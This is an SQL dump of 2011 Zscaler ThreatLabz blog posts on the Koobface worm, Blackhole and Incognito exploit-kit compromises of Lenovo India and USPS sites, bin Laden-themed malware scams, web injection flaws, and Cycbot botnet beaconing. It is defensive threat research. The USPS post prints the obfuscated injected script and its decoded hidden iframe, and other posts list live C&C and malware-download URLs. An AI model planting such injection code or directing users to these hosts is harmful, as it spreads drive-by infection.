INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (400, 'Koobface Worm Still Spreading Using Social Engineering Attack Vectors', 'ThreatLabz', 'May 04, 2011', 'The Koobface worm is not new to Internet users, but remains very active and continues spreading through different mediums using a variety of techniques. Last year, we have blogged about Koobface worm activity. We are still seeing this worm spreading via social engineering attacks. Attackers are creating fake malicious websites, which look like legitimate sites such as YouTube. Then, they lure the victim by posting fake content such as videos which actually lead to the downloading of malicious binary files. Look at the one of the site used to spread this worm using video content:           If you look at the image above, you will see the site is designed like a YouTube. The website shows a fake warning for adult material. The video displays a message saying “it requires Adobe Flash Player 10.37” and then forces a malicious file to download. In fact the latest version of genuine Adobe Flash Player is 10.2 but this video says 10.37 which is not a valid version. Once this file gets executed, it communicates with different servers. Here is the list,       	http://www.powertreecorp.com/.tqe1/?action=fbgen&v=120&crc=669  	http://www.bruleursdeloups.com/.gd1nlpq/?action=fbgen&v=120&crc=669  	http://www.waypoint-center.org/.vye770/?action=fbgen&v=120&crc=669  	http://sphusa.com/.wiqp6j2/?action=fbgen&v=120&crc=669  	http://reishus.de/.zfg35n/?action=fbgen&v=120&crc=669  	http://leonardandself.com/.uozs/?action=fbgen&v=120&crc=669  	http://iq-tech.biz/.8cww/?action=fbgen&v=120&crc=669  	http://careyadkinsdesign.com/.uzb62/?action=fbgen&v=120&crc=669  	http://top-friends.co.za/.zsm4/?action=fbgen&v=120&crc=669  	http://i-dare-you.co.za/.d38o8/?action=fbgen&v=120&crc=669  	http://fatucci.it/.hkly/?action=fbgen&v=120&crc=669  	http://www.flohr.tuknet.dk/.fav3bas/?action=fbgen&v=120&crc=669  	http://www.mx2.jellingnet.dk/.n9u39y5/?action=fbgen&v=120&crc=669  	http://www.neweed.org/.f8sh/?action=fbgen&v=120&crc=669  	http://hillsdemocrat.com/.uit970q/?action=fbgen&v=120&crc=669  	http://rentsatoday.com/.flyx4m/?action=fbgen&v=120&crc=669  	http://www.aicis.it/.zm1jpub/?action=fbgen&v=120&crc=669  	http://plymouth-tuc.org.uk/.eix02/?action=fbgen&v=120&crc=669  	http://lode-willems.be/.xokpra/?action=fbgen&v=120&crc=669  	http://www.cerclewalloncouillet.be/.s6ta/?action=fbgen&v=120&crc=669  	http://www.ilfrutteto.net/.8tsple/?action=fbgen&v=120&crc=669    Zscaler, already has protection in place for these Koobface C&C servers. You can find the ThreatExpert report for this particular attack here. Never trust any site which will force you to download an executable file.    Umesh', 'Social Engineering', 'https://www.zscaler.com/blogs/research/koobface-worm-still-spreading-using-social-engineering-attack-vectors');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (401, 'Latest Victim Of An Exploit Kit - Lenovo, India', 'ThreatLabz', 'May 03, 2011', 'Update 05/04/11 @ 7.49pm IST: Thanks to feedback from an Anonymous blog poster, I\'ve done some further investigation and this attack actually appears to be tied to the Incognito Exploit kit as opposed to the Blackhole Exploit kit.Back in February, I posted a blog about the rising prevalence of attacks involving Blackhole exploit kits. We received numerous comments and emails about the same threat being found on various websites from our blog readers. The toolkit has been linked to from numerous compromised websites, which in turn have victimized a number of their visitors. Attackers are injecting malicious iframes into the legitimate sites, which in turn redirect to malicious websites hosting the Blackhole Incognito exploit kit. We have observed and identified such compromised sites due to Zscaler’s advanced security features in our solution. The latest victim is Lenovo, India whose website for product warranties http://www.lenovowarranty.co.in/ has been compromised, redirecting visitors silently to the Blackhole Incognito exploit kit. Here is the screenshot of the home page of the compromised Lenovo site:                                                  One of the pages on the site, http://www.lenovowarranty.co.in/regspacks2.asp, is infected with a malicious iframe. Here is the screenshot of that page:If you look at the source of page, you will find the malicious iframe injected into the source code as shown below:The malicious iframe points to the site “hxxp://nemohuildiin.ru/tds/go.php?sid=1\". This malicious site actually redirects the user to another malicious website hosting the Blackhole Incognito exploit kit. Here is the packet capture when you visit the mentioned malicious site:Observing the “Location” field in the HTTP header, we see the user is being redirected to another malicious website hosting the malicious toolkit, a common pattern that we’ve seen in the past. The malicious website “hxxp://andromari.cx.cc” returns obfuscated malicious JavaScript code to exploit different vulnerabilities and downloads malicious binaries. Here is the screenshot of the malicious JavaScript sent by this kitI am not going into the details of the exploits themselves as they are related to the same vulnerabilities and toolkit, which I have discussed in an earlier blog. The malicious site hosting the Blackhole Incognito exploit kit only attempts to exploit the victim on their first visit. If you revisit this site, it will either redirect you to Google or simply return a “Page not found” error. This post further supports my claim in an earlier blog, which states that “Blackhole exploit kits are rising”. Blackhole is Exploit kits are definitely a Bad Hole bad for web security.Umesh', 'Compromise;Exploit Kit;Malware;Analysis', 'https://www.zscaler.com/blogs/research/latest-victim-exploit-kit-lenovo-india');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (402, 'Osama Bin Laden Related Malware', 'ThreatLabz', 'May 02, 2011', 'We\'ll continue to update this blog post with new malware we\'re seeing related to Osama bin Laden\'s death, as we expect to see plenty.         ---         hxxp://www.pharmafutar.hu/images/home/fotos.php         leads to low A/V detection malware:         hxxp://www.pharmafutar.hu/images/home/urgentes.dyndns.tv.fotos-osama-bin-laden-morto.com         VirusTotal Report (3/41): Trojan / Koobface         ---    More Facebook scams, attempting to trick the end user into pasting Javascript into the URL bar in order to further propagate the scam.    hxxp://www.facebook.com/pages/Heavenly-father-Help-Us-all/209589715729272  hxxp://www.facebook.com/pages/Osama-Death-Live/213631485333118    ---    Interesting statistic: Zscaler went from seeing fewer than 1,000 URLs containing the terms \'osama\', \'usama\' or \'laden\' on Sunday afternoon, to a peak of over 4 million by 10am PST on Monday morning.     ---         There are a handful of sites cropping up that are advertising that Osama is alive. When visited the page appears as follows:         The go.php script redirects to an Osama is Alive Facebook profile, such as:    hxxp://www.facebook.com/pages/Osama-is-Alive/127361454008017       Google search: intitle:\"SHOCKING Tape - Osama Bin Laden\"         This particular profile is down, however there do appear to be a number of other related Facebook profile pages recently created:           I have not witnessed anything malicious at the moment in this campaign. But because the spammy nature and number of sites / profiles it makes our list.         ---         hxxp://www.limitsmodelos.com.br/ans/TELEVISA.NOTICIAS.Video-Bin.Laden.AVI.exe         V/T Report (32/42): Trojan Rinecud / Pincav         ---    hxxp://www.facebook.com/pages/Exclusive-Osama-Bin-Laden-Death-Video/201412819897862?sk=app_4949752878    Asks Facebook users to \'like\' the scam and then copy/paste Javascript into their URL bar, in order to generate Facebook content promoting the scam. The page alleges that once 25,000 Facebook users have promoted the scam, they will reveal the Osama Bin Laden death video.    ---     hxxp://www.binladensdeathvideo.info/    Let\'s just call this \'poor man\'s Likejacking\', with a dash of malvertising. The site manually walks a user through manually \'liking\' content and then posting it to their Facebook page, which is allegedly required, before the video can be viewed. Upon clicking on the \'WATCH THE VIDEO NOW\' link a fake \'age verification\' screen is displayed, requiring the user to click on advertising links.       ---         Osama Bin Laden Death Video Facebook Scams:         For example,         hxxp://www.facebook.com/pages/Exclusive-Osama-Bin-Laden-Death-Video/201412819897862?sk=app_4949752878         --> spyingonyou.info/osama/a.js              Many other Facebook profiles as well:      ---    hxxp://www.blogdelnarco.com/2011/05/cae-osama-bin-laden.html    News story which includes links to video with fake VLC warnings. The page may be infected with malvertising. The malware is not consistently displayed on the page.    V/T report (19/41): Hotbar Adware    ---    hxxp://osamabinladenfotosineditas.blogspot.com/    A variety of attacks are included on the page, including Likejacking and Adware.    V/T Report (20/41): Hotbar Adware        ---         hxxp://terrorismo.myhotting.com/videos/paquistao/terrorismo/osama/02/05/2011/video-em-que-OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje.php         302 redirects to:      hxxp://130.237.197.211/images/OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje-obama-se-passa-por-mentiroso.exe         V/T Report (24/41): Trojan Banload         Seen spread primarily through spamvertised messages to mail.live.com         Others seen:      68.7.242.6/images/OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje-obama-se-passa-por-mentiroso.exe    33.225.237.6/images/OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje-obama-se-passa-por-mentiroso.exe    148.227.118.6/images/OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje-obama-se-passa-por-mentiroso.exe    131.128.109.6/images/OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje-obama-se-passa-por-mentiroso.exe    100.166.108.6/images/OSAMA-BIN-Laden-aparece-segurando-jornal-com-a-data-de-hoje-obama-se-passa-por-mentiroso.exe           Other Banload:    noticias.terra.woonet.co.kr/videos/paquistao/terrorismo/osama/05/05/2011/video-proibido-mostra-momento-da-execucao-de-obama-por-agentes-na-operacao.exe         V/T Report (19/41)         ---       hxxp://shop.akod.se/BinLadenMorto.avi_de_msn-videos.com         V/T Report (7/41): Password Stealing Trojan         ---', 'Malware', 'https://www.zscaler.com/blogs/research/osama-bin-laden-related-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (403, 'Malware Sites Already Capitalizing On Announcement Of Osama Bin Laden\'s Death', 'Michael Sutton', 'May 01, 2011', 'Update (025/02/11 9:40am EST): A before/after comparison of the photoshopped image used in the malicious post can be found here.       Within hours of the announcement of Osama Bin Laden\'s death, we are already seeing malicious sites emerge to capitalize on the news. One Spanish language site displays a purported photo of a murdered Osama Bin Laden and includes a story about the US led operation. Farther down the page, the reader is presented with a Flash Player window with a message indicating that the user must first update a VLC plugin, which is a popular media player, in order to view the video. When the user clicks on the link, they will download a file titled XvidSetup.exe. This file is actually a popular adware tool known as hotbar. At present, 19 of 41 antivirus engines are blocking the file.    Sadly, there will be no shortage of scams taking advantage of this historic global news. Users should use caution any time a site claims to be offering video or photos related to this news.    - michael', 'Malware', 'https://www.zscaler.com/blogs/research/malware-sites-already-capitalizing-announcement-osama-bin-ladens-death');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (404, 'Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), SQL Injection, HTML Injection, Etc.', 'Julien Sobrier', 'April 28, 2011', 'Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), SQL Injection and HTML Injection are security flaws that have been around for years. They are well know vulnerabilities, with well-known solutions. As we\'ve seen in recent weeks, even well-established tech companies are not immune to these basic flaws:\r\n\r\n	MySQL was compromised by SQL Injection\r\n	Wordpress.com was compromised by an HTML Injection/Cross-Site Request Forgery\r\n	Facebook was hit by a worm exploiting an XSS vulnerability\r\n	Barracuda Networks was compromised by SQL Injection\r\n	Twitter had an HTTP Response Splitting flaw\r\n\r\nThese flaws go by different names, but there cause and consequences are about the same. They are caused by insufficient user input sanitization, and result in malicious code being executed in the browser of the user visiting the site.\r\n\r\nI believe one of the reason these flaws are still present in new websites is due to the fact that their exploitation and consequences are not fully understood. Here are few misconceptions I have heard.\r\n\r\nXSS is simply about popups\r\n\r\nProof-of-concept for XSS flaws often consists of showing a JavaScript alert popup being displayed. This is just for demonstration purposes. A successful XSS injection can insert any JavaScript into the page, which can, amongst other things:\r\n\r\n	steal user credentials (login, password, session, etc.) and other confidential information (credit card number, mailing address, etc.)\r\n	hijack administrator sessions\r\n	force the download of malicious executables\r\n	run other types of code: Flash, Java, ActiveX, etc.\r\n\r\nSQL injection is all about reading data\r\n\r\nSQL Injection is not only used to dump a database, or to login without valid user credentials. A lot of web applications, like Wordpress, store the site content into a database. If an attacker get write access to the database, he can insert malicious code which will then be rendered for all users.\r\n\r\nUsers are at fault for not being diligent\r\n\r\nAnother belief is that a user must click on link that contains the XSS, CSRF of HTML infection in order to be affected. Since the \"bad\" content is often shown in the URL the user clicks on, users should simply be more careful.\r\n\r\nFirst, \"bad\" links can be hidden with a URL shortener, for example and users may not be aware were they will be redirected. Second, all attacks are not necessarily transient. Malicious content can be inserted by one user, or the attacker, and displayed to all other users via a persistent XSS or HTML Injection flaw. It is the responsibility of the webmaster to protect users. This responsibility should not be placed on each user.\r\n\r\n\r\nA good blacklist will do the trick\r\n\r\nUser input filtering is often performed by a blacklist: allow anything, except a few dangerous strings. Unfortunately with HTML and JavaScript, there are too many ways to do the same things. Here are a couple of examples\r\n\r\nConditional comments\r\n\r\nHTML comment should be safe, right? Wrong. Internet Explorer actually interprets the content of HTML comments called conditional comments. These 2 lines will make Internet Explorer load and execute JavaScript for evil.com:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			These lines are not interpreted as comments by IE\r\n		\r\n	\r\n\r\nConditional comments for Internet Explorer also exist for Javascript:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			document.write is executed by Internet Explorer\r\n		\r\n	\r\n\r\n\r\nXSS can hide anywhere\r\n\r\nA XSS attack does not require the addition of a new script tag on a page. It can hide in a link, tag attributes, CSS, etc.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Examples of harmful JavaScript/HTML insertion\r\n		\r\n	\r\n\r\nEncoding\r\n\r\nDon\'t forget about HTML encoding, JavaScript encoding, JavaScript obfuscation, ASCII-7, UTF with null characters, etc.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Some examples of encoding\r\n		\r\n	\r\n\r\n\r\n\r\nIt\'s pretty much impossible to get a comprehensive list of dangerous strings. Instead, a tight whitelist of authorized strings and/or characters should be used first, and only supplemented with a blacklist as needed.\r\n\r\nI hope that the high-profile attacks that happened recently will push web developers to pay more attention to the code injection vulnerabilities. Many programming frameworks include libraries and functions to take care of most of these issues. Hopefully they will be used everywhere user input is received and displayed. Don\'t ever trust external input!\r\n\r\n-- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/cross-site-scripting-xss-cross-site-request-forgery-csrf-sql-injection-html-injection-etc');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (405, 'Will Mobile Apps Be The Achilles\' Heel Of Web Security?', 'Michael Sutton', 'April 21, 2011', 'Inspired by a post yesterday from Alasdair Allan and Pete Warden discussing how the iPhone records and stores geo-location data, I decided to poke around to see what other interesting security issues may be lurking among the iPhone backup files. I\'ve been concerned for some time that we\'re due for a flood of security issues in mobile apps, given the explosive growth that we\'ve seen, with thousands of developers rushing to profit from the app store model. Successful web services such as Twitter, Dropbox, Evernote, etc. have willingly provided APIs to allow integration with third party technologies, including mobile apps. This greatly enhances the value of such services, but unfortunately, the services then entrust third parties to implement appropriate security controls so as not to expose confidential user data. Unfortunately, this is not always achieved.    iOS devices record backup archives when the device is synced to iTunes. On OS X, the archive is stored in the following directory:    /Users/[Username]/Library/Application Support/MobileSync/Backup/    Apple makes some effort to obfuscate the content by archiving everything into files with titles comprised of seemingly random strings. However, unarchiving the content back to its original form is a trivial task using a tool such as the iPhone Backup Extractor. Once unpacked, you will find a variety of content including documents and images, but most configuration data is stored within either SQLite database files or .plist files. The former can be read with any SQLite viewer such as SQLite Database Browser, while the latter is simply an XML file that can be viewed in a text editor.    JotNot Scanner Pro    Let\'s look at a particularly egregious example of poor application security practices. JotNot Scanner Pro is an iPhone app that I rely on heavily during business travel. It is a popular app, first released over two years ago, which essentially turns your iPhone into a document scanner and allows you to store the scanned content either locally or upload them to a host of web based storage services. While Apple doesn\'t release sales figures for individual apps, with over 3,600 people having reviewed all versions of JotNot on iTunes, it\'s clear that this is a broadly adopted application.    The JotNot Pro backup archive is labelled com.mobitech3000.JotNotIPhone. Upon extracting the archive we see a directory structure with the Documents folder containing copies of previously scanned documents, while various configuration settings for the application can be found in the Library folder. The file that we\'re interested in is /Library/Preferences/com.mobitech3000.JotNotIPhone.plist:      	  		  			   		  		  			   		  	    This .plist file is an XML document, which includes version information and various user defined settings, including usernames and passwords for the third party storage services that the user has enabled to upload scanned documents to. JotNot works with a variety of online services and must authenticate with these services in order to upload documents on behalf of the app user. Unfortunately, the authentication credentials stored for Evernote, Google Docs, Apple\'s iDisk and any WebDav enabled server are stored in plain text. Therefore, anyone that gained access to this backup file, would then have your username/password for these services. It is particularly concerning that Google Docs and Apple\'s Mobile Me are on this list. Both services leverage single sign-on for their various online services, so knowledge of these credentials would also provide access to Gmail and Apple\'s MobileMe email service.    Thoughts     As an end user, you\'ve followed best practices to keep your access credentials safe. You\'ve chosen a complex password. You change it regularly and never share it with anyone. Unfortunately, all of that effort goes out the window when you trust an app with your data, which doesn\'t store it securely. In this situation, if you\'re a JotNot user and someone gains access to your computer either locally or remotely, they now have access to web services where you store confidential data such as documents, photos, receipts, etc. They may also gain access to your email accounts. Unfortunately, as a user, you really have no way of knowing which apps have incorporated appropriate security controls. Despite the fact that Apple must bless all apps before hosting them in the App Store and is very willing to take a 30% cut for doing so, they\'re clearly concerned more with blessing the \'user experience\' as opposed to security. Storing passwords in clear text is security 101. If I can spot it in 15 minutes, surely they can have processes in place to identify and prohibit at least basic security issues. Web services should also be exposing APIs that don\'t accept usernames/passwords but rather tokens generated by the service to ensure that third party apps don\'t have the option to expose access credentials in the first place.    Why this isn\'t the first and won\'t be the last example of insecure mobile apps putting users at risk:       	Land Grab - Developers have realized the power of the mobile apps stores to generate profits and are rushing to get first mover advantage in each an every app category. Sadly, when developers are rushing to get products out the door, security is often left on the cutting room floor.  	New Technologies - iOS apps primarily leverage Objective-C as the programming language of choice for creating apps. This is a new language for many developers but thanks to user-friendly development tools, developers are able to produce mobile apps, even without a thorough knowledge of Objective-C.  	Gatekeeper - Apple is not ensuring that apps are secure before allowing them into the App store. Unfortunately, users don\'t realize this and are eagerly handing over passwords to apps that may or may not store them correctly.      Keep this in mind next time you\'re downloading the latest must have app. and handing over your passwords.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/will-mobile-apps-be-achilles-heel-web-security');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (406, 'Search Engine Security Available For Firefox Mobile', 'Julien Sobrier', 'April 20, 2011', 'While the number of threats targeting mobile devices is increasing, web browsers for mobile devices are still lacking the security features of their Desktop counterparts. For example, Firefox 4 Mobile (also known as Fennec), does not include Google Safe Browsing to prevent users from navigating to known malicious sites.    Zscaler has released 3 Firefox add-ons to protect users, such as Search Engine Security, BlackSheep and Zscaler Safe Shopping. I have now ported Search Engine Security to the mobile version of Firefox 4, and will release Zscaler Safe Shopping for mobile devices later on.           Search Engine Security    The add-on behaves the same as the desktop version. It protects users from malicious search results in Google, Bing and Yahoo!, by modifying the Referer and User Agent headers, when the users leave these sites.    You can turn enable/disable Search Engine Security for any specific search engine. The add-on will show it\'s status in the search results.       	  		  			  		  		  			Search Engine Security protection for Google  		  	      The settings are the same as those used for the desktop version. You can specify which Referer header to use (none by default) and whether or not to modify the user agent (choose Yes for better protection). Because of restrictions in Firefox Mobile, the whitelist, used to prevent header changes for particular sites, is restricted to a single URL.         	  		  			  		  		  			Search Engine Security options for Mobile  		  	        	  		  			   		  	    How to test it    Search Engine Security works transparently and most users will not notice the change of HTTP headers. The equivalent of Live HTTP Headers for Fireofx Mobile is Mobile Tools. Unfortunately, this extension shows HTTP before they are modified by Search Engine Security. To see the changed Referer and User Agent headers, look for \"referer mobilefish\" in Google. Click on the first search result. The page from mobilefish.com shows your User Agent string as well as Referer. You can try it with Search Engine Security truned on and off for Google to see the different values.       	  		  			  		  		  			User Agent and Referer headers modified by Search Engine Security  		  	      Don\'t forget to restart Firefox after you install this add-on. It does not yet take advantage of the restartless feature introduced in Firefox 4.           -- Julien', 'Mobile', 'https://www.zscaler.com/blogs/research/search-engine-security-available-firefox-mobile');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (407, '30 Days Of Cycbot', 'ThreatLabz', 'April 15, 2011', 'Introduction:I started doing some analysis on a beaconing pattern that I observed this past week.  Initially the pattern and domains that I observed had little open-source information available for my searches, but as I started widening my search in the logs I found other infected customers across a variety of sectors and was able to track a botnet using a large number of IPs and domains for its command and controls.  This is the \"Cycbot\" botnet... newly detected around August 2010 (reference), it is a botnet that has not appeared much in the media, but appears to be making its rounds infecting hosts in greater numbers- especially within the last month from my perspective.The Beaconing Pattern:The pattern typically followed HTTP GET requests with this format:FQDN/blog/images/3521.jpg?vNUM1=NUM2&tq=BASE64_Data    and the transactions were made with User Agent string: \"mozilla/2.0\"The BASE64_Data appears to be base64 encoded \"encrypted\" data.The vNUM1=NUM2 parameter was occasionally omitted, when this was omitted I was able to obtain a possible brute-force the BASE64 data that was XOR \"encrypted\".  When the \"v\" parameter was present I was not able to decrypt.  This particular encoded pattern was consistent among infected hosts:tq=RA1DQxZBDVlUFQN0AQYECRUCBlMVA3QBAwcWQw0BFlhCQw0APXNzJnE9aWQ=Which might be decoded with:0x30 XOR key, displaying:t=ss&q=id%3D1649%26c%3D137&s=1&hrs=0which is, t=ss&q=id=1649&c=137&s=1&hrs=0  or 0x55 XOR key, displaying a possible cryptic output / command: s:tt!v:nc\"4C613>\"51d\"4C640!t:6!out:7Note: while tracking the incident back in time, really the only consistent string to trigger on for the beacons are:?tq=BASE64_data?vNUM1=NUM2&tq=BASE64_DataWhich by itself could generate some false-positives.Tracing back in time through our logs, this pattern first emerges the morning of March 10th. From this initial infection to present, the number of infected hosts and C&C IPs/domains used has consistently risen. Open-Source Information:Googling around, this was a related and very recently submitted samples to ThreatExpertThese reports identify that the malware opens a backdoor on the infected system (e.g., 59495/TCP), and also shows the MD5 of the submitted samples:  46991fb9d3839e7b5b2dce4fb997340d 60c6636f9cae2df3d0ae76e5487521d3 4E6BE45CFF3CAAABA9D08622A6B0DC2CUsing the MD5 as a search on VirusTotal, I was able to find recent anti-virus reports with very low detection: V/T Report (8/41) V/T Report (6/42)Which is identified as malware names: Gen:Variant.Kazy.19331, Win32:Cycbot-CL, Win32/Kryptik.MPXCommand and Control Infrastructure:Tracking the observed infections back over time, I was able to track a fairly robust set of IPs and domains used to keep the botnet alive.  Below is the information that I saw since March 10:C&C DomainsC&C IPsSome of the C&Cs appear to be sites that were compromised, for example: onlineinstitute.comIn each of the cases of these sites, directory indexing is on, e.g.,onlineinstitute.com/g7/images/Many of the sites appear to be hosted by BlueHost.But the majority of the C&Cs were recently registered domains with registration information ranging from China to Russia to \"private\" registration.  Below is a list of some of the email addresses used (by the criminals) to register the domains,Using the above information in Google searches, it is possible to correlate other malicious domains.  Keep an eye out for Cycbot in your networks, this botnet does not seem to be slowing down. And always be on the lookout for new beaconing patterns that emerge within your environment!', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/30-days-cycbot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (408, 'Hundreds Of College And Government Websites Still Redirecting To Fake Stores', 'Julien Sobrier', 'April 13, 2011', 'In January, I talked about high-profile websites, which had been hacked to redirect users to fake online stores. One unique aspect of the hack was the fact that the attackers had set up additional web servers on non-standard ports. Most of the domains I listed in the post were cleaned up pretty quickly.\r\n\r\nThree months later, there are still a number of hijacked sites redirecting to the same fake stores. One day recently, I found 68 hijacked domains, mostly college and government sites, including:\r\n\r\n	Berkeley: cshe.berkeley.edu\r\n	Harvard: research4.dfci.harvard.edu\r\n	Purdue University: web.ics.purdue.edu\r\n	Oklahoma State University: osu.okstate.edu\r\n	Australian Government: brokenhill.ses.nsw.gov.au\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			List of hijacked websites redirecting to a fake store found in 1 day\r\n		\r\n	\r\n\r\n\r\nWhile some of the pages are still hosted on alternate web servers, like hxxp://nigelbeale.com:8080/download?online=329 now, most pages have actually been added to the hacked web server, on port 80.\r\n\r\nThe fake stores have not changed much. They all claim to provide discounted software from Microsoft, Adobe, Apple, etc., for download. Visually, they all look the same and we still see new domains used for the fake online stores.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake software store\r\n		\r\n	\r\n\r\n\r\n\r\nA Google search for \"buy windows 7 pro\", for example, still shows primarily hijacked sites as the top of the results. It is very disappointing that Google has not cleaned up their search results after several months...and Bing doesn\'t do a better job on this one either.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Google search for \"buy windows 7 pro\". Most redirect to a fake store.\r\n		\r\n	\r\n\r\n\r\n\r\n\r\nProtect yourself with Zscaler Safe Shopping\r\n\r\nThe majority of the fake stores are still not flagged by blacklists used by popular browsers or by antivirus software. Firefox users can instead leverage the free Zscaler Safe Shopping add-on we released a couple of months back, in order to be warned when they visit a fake online store.\r\n \r\n\r\n\r\n-- Julien', 'Compromise', 'https://www.zscaler.com/blogs/research/hundreds-college-and-government-websites-still-redirecting-fake-stores');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (409, 'USPS.gov Website Infected With Blackhole Exploit Kit', 'Michael Sutton', 'April 07, 2011', 'Update (04/07/2011 10:03am PST): USPS officials have taken the http://ribbs.usps.gov web site down to address the infection.    A United States Postal Service website (http://ribbs.usps.gov) has been infected with the Blackhole Exploit kit. As we\'ve discussed previously, the Blackhole Exploit kit, a commercial exploit kit developed by Russian hackers, is being seen in an increasing number of attacks. Last week, we reported on how it had been used to infect Worldfest, a Houston, Texas music festival and this week, it has penetrated the website of an independent US government agency, namely that of the postal service. RIBBS stands for Rapid Information Bulletin Board System and deals with Intelligent Mail services, such as barcodes that allow for better tracking and logistics. As with similar infections, the attack follows numerous phases, each being hosted on a separate domain, with each leveraging various obfuscation techniques to hide the attack. Here we will walk through the various phases to detail the attack.    Phase One: Initial Infection    On April, 6th, our attention was drawn to alerts indicating that Zscaler was blocking access to http://ribbs.usps.gov due to the presence of the following encoded Javascript:    <script>  document.write(eval(String.fromCharCode(100,111,99,118,109,101,110,116,46,119,114,105,116,101,40,39,60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,112,114,105,99,104,101,115,111,110,46,104,100,100,49,46,114,117,47,108,111,108,46,112,104,112,34,32,104,101,105,103,104,116,61,34,49,34,32,119,105,100,116,104,61,34,49,34,32,115,116,121,108,101,61,34,100,105,115,112,108,97,121,58,110,111,110,101,34,62,60,47,105,102,114,97,109,101,62,39,41,59)));  </script>      This content uses a simple encoding technique, whereby each letter is encoded as it\'s ASCII equivalent. When decoded, we see the following iframe:    document.write(\'<iframe src=\"http://pricheson.hdd1.ru/lol.php\" height=\"1\" width=\"1\" style=\"display:none\"></iframe>\');      Phase Two: Redirection      The page used in the aforementioned iframe has since been taken offline, presumably by the domain administrator, suggesting that the attackers were simply using an otherwise legitimate site for this stage of the attack. The page was however accessible when the attack was first discovered and contained only the following unencoded iframe:    <script>document.write(\'<iframe src=\"http://oldschool.vv.cc/access7/forum.php?tp=10169-1\" height=\"1\" width=\"1\" style=\"display:none\"></iframe>\');</script>      Phase Three: Attack    It is on this final page, where the attack ultimately takes place. This domain has been known to host other attacks. At the time the attack was first detected, this domain had not been blacklisted by any of the major malicious URL services, but as of today, the majority are now blocking the domain.    This page has been disguised to look like a standard 404 Page Not Found error message, but when viewing the source code, in reality, it is delivering a massive bundle of obfuscated Javascript. When decoded, we see a rather complex logic flow attempting to discern the operating system, web browser type and the existence/absence of components such as Java and ActiveX, in order to determine the appropriate attack payloads to deploy.    Operating System Identification      var c=this,a=navigator,e=\"/\",i=a.userAgent||\"\",g=a.vendor||\"\",b=a.platform||\"\",h=a.product||\"\";  c.OS=100;  if(b)  {  var f,d=[\"Win\",1,\"Mac\",2,\"Linux\",3,\"FreeBSD\",4,\"iPhone\",21.1,\"iPod\",21.2,\"iPad\",21.3,\"Win.*CE\",22.1,\"Win.*Mobile\",22.2,\"Pocket\\\\s*PC\",22.3,\"\",100];  for(f=d.length-2;      Browser Identification    c.isGecko=(/Gecko/i).test(h)&&(/Gecko\\s*\\/\\s*\\d/i).test(i);  c.verGecko=c.isGecko?c.formatNum((/rv\\s*\\:\\s*([\\.\\,\\d]+)/i).test(i)?RegExp.$1:\"0.9\"):null;  c.isSafari=(/Safari\\s*\\/\\s*\\d/i).test(i)&&(/Apple/i).test(g);  c.isChrome=(/Chrome\\s*\\/\\s*(\\d[\\d\\.]*)/i).test(i);  c.verChrome=c.isChrome?c.formatNum(RegExp.$1):null;  c.isOpera=(/Opera\\s*[\\/]?\\s*(\\d+\\.?\\d*)/i).test(i);  c.verOpera=c.isOpera&&((/Version\\s*\\/\\s*(\\d+\\.?\\d*)/i).test(i)||1)?parseFloat(RegExp.$1,10):null;  c.addWinEvent(\"load\",c.handler(c.runWLfuncs,c))        Malicious Payloads       	calc.exe - detection rate: (5/41 AV vendors)  	info.exe - detection rate: (4/42 AV vendors)  	mario.jar - detection rate: (4/41 AV vendors)  	eedad.pdf - detection rate: (1/41 AV vendors)  	298dd.pdf - detection rate: (5/42 AV vendors)  	27537.pdf - detection rate: (5/41 AV vendors)  	57496.pdf - detection rate: (1/42 AV vendors)  	javatrust.php - detection rate: (0/42 AV vendors)  	  		CVE-2010-4452 - Sun Java Applet2ClassLoader Remote Code Execution Exploit (Metasploit)  	  	  	java_skyline.php - detection rate: (2/41 AV vendors)  	  		CVE-2010-3552 - Sun Java Runtime New Plugin docbase Buffer Overflow (Metasploit)  	  	      Status    Yet again, we have a legitimate website with a significant user base being used as a catalyst for attack. Combine that with an abysmal detection rate on the malicious payloads by desktop AV, the first and often only line of client side defense for many enterprises, and we have a potent attack that has no doubt affected many end users.    USPS officials have been informed of the infection and have acknowledged the issue. The injected code remains on the ribbs.usps.gov site as at the time of this posting but the attack has been neutered as the website used in step two of the attack has been taken offline.    At least snail mail is still safe...    - michael', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/uspsgov-website-infected-blackhole-exploit-kit');
